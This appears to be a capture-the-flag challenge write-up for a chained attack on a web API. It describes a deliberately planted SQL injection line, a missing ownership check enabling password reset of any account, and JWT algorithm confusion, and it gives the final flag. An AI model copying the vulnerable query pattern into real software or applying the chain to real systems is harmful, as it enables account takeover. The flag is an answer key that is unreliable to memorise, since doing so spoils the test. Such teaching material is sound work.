| **File** | `routes/search.py` — `GET /api/v1/search` |
| **Line** | `` f"SELECT value FROM items WHERE name LIKE '%{q}%'" `` |
| **Type** | UNION-based SQL injection (read-only) |
| **Impact** | Dump any table — specifically admin user_id |

**Root cause:** User input `q` is directly interpolated into the SQL query string without parameterization.

**Why read-only:** Python's `sqlite3.execute()` only processes the first SQL statement — stacked queries (`; INSERT ...`, `; UPDATE ...`) are silently truncated. The injection is limited to UNION-based data exfiltration.

**Key exfiltration:** The admin `user_id` is randomized between 1000–9999 at container startup. It cannot be guessed or brute-forced in reasonable time. SQLi is the only intended path to discover it.

---

### Vulnerability 3: IDOR (Insecure Direct Object Reference)

| Property | Value |
|----------|-------|
| **File** | `routes/users.py` — `PUT /api/v1/users/{id}/password` |
| **Line** | Missing: `current_user["user_id"] == user_id` |
| **Type** | IDOR — broken access control |
| **Impact** | Reset any user's password → account takeover |

**Root cause:** The endpoint authenticates the caller (must be non-guest) but does not verify that the caller is modifying their own account. Any authenticated `role=user` token can reset any `role=admin` or `role=user` account password.

**Constraints:**
- Guest role cannot use this endpoint (HTTP 403)
- Can only target users with role `admin` or `user` (role filter — cannot reset guest)
- Combined with JWT confusion: we get a `role=user` token for free, which is enough to exploit IDOR

---

### Dependency Chain

```
[APK RE]
  libpingpong.so .rodata
       ↓ XOR 0xA3
  public.pem (451 bytes)
       ↓ used as HMAC secret
  [VULN 1] JWT Algorithm Confusion
       ↓ forged HS256 token, role=user
       ↓
  [VULN 2] SQL Injection
       ↓ UNION dump → admin_id (random, unknown)
       ↓
  [VULN 3] IDOR
       ↓ reset admin password
       ↓
  Login as admin → real RS256 token
       ↓
  GET /api/v2/d4t4/r3tr13v3   (path from .so XOR 0x47)
       ↓
  flag_part2 = "vm_ch41n_pwn3d}"

+

  chain.dat decrypt → flag_part1 = "CHC{jn1_p1ng_p0ng_"

= CHC{jn1_p1ng_p0ng_vm_ch41n_pwn3d}
```

Each vulnerability gates the next. No step can be skipped.


## Flag

`CHC{jn1_p1ng_p0ng_vm_ch41n_pwn3d}`
